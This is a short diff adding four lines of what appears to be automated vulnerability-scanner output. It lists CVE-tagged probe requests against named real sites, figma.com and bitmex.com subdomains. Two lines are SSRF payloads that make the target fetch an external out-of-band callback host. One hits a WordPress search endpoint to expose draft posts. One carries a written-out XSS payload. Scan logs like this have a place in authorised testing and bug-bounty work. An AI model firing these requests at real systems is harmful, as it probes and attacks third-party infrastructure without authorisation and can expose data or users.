@@ -1,0 +1,4 @@
+[CVE-2015-8813] [http] [high] https://cors-image-proxy.figma.com/Umbraco/feedproxy.aspx?url=http://cmu7l7163dlborjoseb05cfxkje6qd865.oast.fun
+[CVE-2017-18638] [http] [high] https://cors-image-proxy.figma.com/composer/send_email?to=ddoH@ZsuR&url=http://cmu7l7163dlborjoseb08m7w7ra3u8iu6.oast.fun
+[CVE-2022-2535] [http] [medium] https://blog.bitmex.com/wp-admin/admin-ajax.php?action=searchwp_live_search&swpquery=a&post_status=draft
+[CVE-2022-2627] [http] [medium] https://blog.bitmex.com/wp-admin/admin-ajax.php?td_theme_name=Newspaper&v=11.2 [xss_payload="<form><math><img+onerror=alert(document.domain)+src=1><mtext></form>"]
